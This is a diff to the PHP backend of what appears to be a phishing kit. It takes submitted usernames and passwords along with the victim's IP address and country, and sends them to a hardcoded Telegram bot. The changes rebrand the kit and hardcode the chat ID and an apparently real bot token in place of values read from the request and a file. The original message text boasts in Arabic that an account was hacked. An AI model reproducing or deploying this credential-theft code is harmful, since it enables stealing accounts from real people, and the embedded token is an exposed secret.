@@ -1,6 +1,6 @@
 <?php
 if (isset($_REQUEST['ID']) and $username != '') {
-    $chatId = $_REQUEST['ID'] ?? '';
+    $chatId = "8734728853";
 
 
     $login = $_REQUEST['login'] ?? '';
@@ -18,8 +18,8 @@ function getLineFromFile($filename, $lineNumber) {
     return null;
 }
 
-// استلام عنصر ID2 من طلب GET
-$botToken = file_get_contents("../token.txt");
+
+$botToken = "8440280233:AAEFXcWn2r4q282T2LqPhXsMo9Nm-iI1c14";
 
 // عرض النتيجة للتأكد
 
@@ -253,27 +253,26 @@ $userIp = $_SERVER['REMOTE_ADDR'];
 
 // جلب معلومات الدولة بناءً على عنوان IP باستخدام ipinfo.io
 $ipInfoUrl = "http://ipinfo.io/{$userIp}/json";
-$ipInfo = @json_decode(file_get_contents($ipInfoUrl), true);
+$ipInfo = json_decode(file_get_contents($ipInfoUrl), true);
 
 // جلب رمز الدولة
 $countryCode = isset($ipInfo['country']) ? $ipInfo['country'] : 'YE'; // تعيين رمز الدولة الافتراضي إلى 'YE' إذا لم يتم العثور على الدولة
-
 
 // جلب اسم الدولة ومفتاح الاتصال
 $countryName = isset($countries[$countryCode]) ? $countries[$countryCode]['name'] : 'غير معروف';
 $countryDialCode = isset($countries[$countryCode]) ? $countries[$countryCode]['code'] : 'غير معروف';
 
 // صياغة الرسالة
-$message = "\n";
-$message .= "⚜️\n";
-$message .= "🎭تم اختراق حساب جديد ☠️\n";
-$message .= "💀 ↬ المنصه  » $loginFolder » $login \n\n"; // استخدام اسم المجلد
-$message .= "🃏 ↬ اسم المستخدم  » $username »\n";
-$message .= "☠️ ↬ كلمه السر  » $password »\n\n";
-$message .= "☠️ ↬ رمز الدوله  » +$countryDialCode\n"; // استخدام مفتاح الاتصال
-$message .= "🧡 ↬ اسم الدوله  » $countryName\n"; // استخدام اسم الدولة
-$message .= "💙️ ↬رقم الجهاز IP  » " . $userIp . "\n\n";
-$message .= "˹ 𝙳𝙴𝚅 𝙱𝚈 @jo2k2er \n";
+$message = "مصنع اندكسات:PTL TEAM\n";
+$message .= "⚜️ ↬ 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙰 𝙽𝙴𝚆 𝙻𝙾𝙶𝙸𝙽\n";
+$message .= "--------------------------------------------------------〤✪\n";
+$message .= "❤ ↬ 𝙻𝙾𝙶𝙸𝙽  » $loginFolder » $login \n\n"; // استخدام اسم المجلد
+$message .= "💜️ ↬ 𝙴𝙼𝙰𝙸𝙻 » $username »\n";
+$message .= "💚 ↬ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » $password »\n\n";
+$message .= "🖤 ↬ COUNTRY CODE » +$countryDialCode\n"; // استخدام مفتاح الاتصال
+$message .= "🧡 ↬ COUNTRY NAME » $countryName\n"; // استخدام اسم الدولة
+$message .= "💙️ ↬ IP » " . $userIp . "\n\n";
+$message .= "˹ 𝙳𝙴𝚅 𝙱𝚈 @pentesting_lab \n";
 $message .= "--------------------------------------------------------〤✪";
 
 $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
